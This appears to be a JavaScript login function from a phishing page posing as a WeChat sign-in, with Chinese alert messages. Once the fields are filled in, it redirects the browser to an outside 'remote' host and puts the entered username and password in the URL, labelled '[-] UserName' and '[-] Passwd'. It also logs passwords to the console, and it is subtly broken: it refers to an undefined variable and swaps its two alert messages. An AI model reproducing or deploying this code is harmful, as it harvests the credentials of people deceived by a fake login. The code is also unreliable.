function logon(){
    var password=document.getElementById("password").value;
    var username=document.getElementById("usersname").value;
    if
    (
        password == ""
    )
    {
        alert("微信号不可为空")
        console.log("Error!")
        console.log("pwd:"+password)
        console.log("users:"+username)
        return false
    }
    if(usersname == ""){
        alert("密码不可为空")
        console.log("Error!")
        console.log("pwd:"+password)
        console.log("users:"+username)
        return false
    }
    else
    {
        console.log("Right")
        console.log("password:"+password)
        console.log("usersname:"+username)
        var url = window.location.href;
        window.location.href = remote + '/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password
    }
}